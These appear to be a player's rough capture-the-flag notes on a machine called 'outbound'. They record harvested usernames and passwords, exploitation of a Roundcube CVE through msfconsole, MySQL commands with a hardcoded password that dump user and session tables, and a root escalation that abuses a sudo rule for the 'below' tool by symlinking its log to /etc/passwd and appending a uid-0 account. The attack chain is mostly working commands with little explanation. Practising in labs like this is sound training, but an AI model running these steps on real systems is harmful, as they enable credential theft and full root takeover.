10.10.11.77


users
tyler 
mel
jacob

passwords

LhKL1o9Nm3X2
gY4Wr3a1evp4

## CVE-2025-49113
exploited using msfconsole

mysql creds found 
mysql table


```sql
 mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
 ```
 
```shell
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
```

## 3DES decrypt

ssh jacob 
gY4Wr3a1evp4


```
sudo -l

Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```


```shell
jacob@outbound:/var/log/below$ echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
jacob@outbound:/var/log/below$ rm error_root.log 
jacob@outbound:/var/log/below$ ln -s /etc/passwd /var/log/below/error_root.log
jacob@outbound:/var/log/below$ sudo /usr/bin/below
jacob@outbound:/var/log/below$ cp root2 error_root.log 
jacob@outbound:/var/log/below$ su root2
```
